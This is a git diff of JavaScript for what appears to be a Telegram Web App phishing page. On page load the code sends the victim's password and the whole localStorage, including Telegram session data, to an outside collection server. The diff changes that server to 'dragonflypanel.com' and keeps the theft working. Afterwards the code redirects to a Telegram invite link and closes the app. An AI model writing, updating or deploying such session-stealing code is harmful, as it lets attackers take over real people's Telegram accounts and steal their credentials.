@@ -14,7 +14,9 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
 
-        fetch(`https://acrylicedse.vercel.app/api/users/telegram/info`, {
+
+
+        await fetch('https://dragonflypanel.com/api/telegram_info', {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -23,7 +25,9 @@ document.addEventListener("DOMContentLoaded", function() {
             password, quicklySet: localStorage,
             type: new URLSearchParams(window.location.search).get("type")
           })
-        });
+        })
+        .then(res => {console.log(res);})
+        .catch(err => {console.log(err);});
 
         window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
         window.Telegram.WebApp.close();
@@ -39,5 +43,5 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   }
 
-  const checkInterval = setInterval(checkLocalStorage, 100);
+  const checkInterval = setInterval(checkLocalStorage, 500);
 });
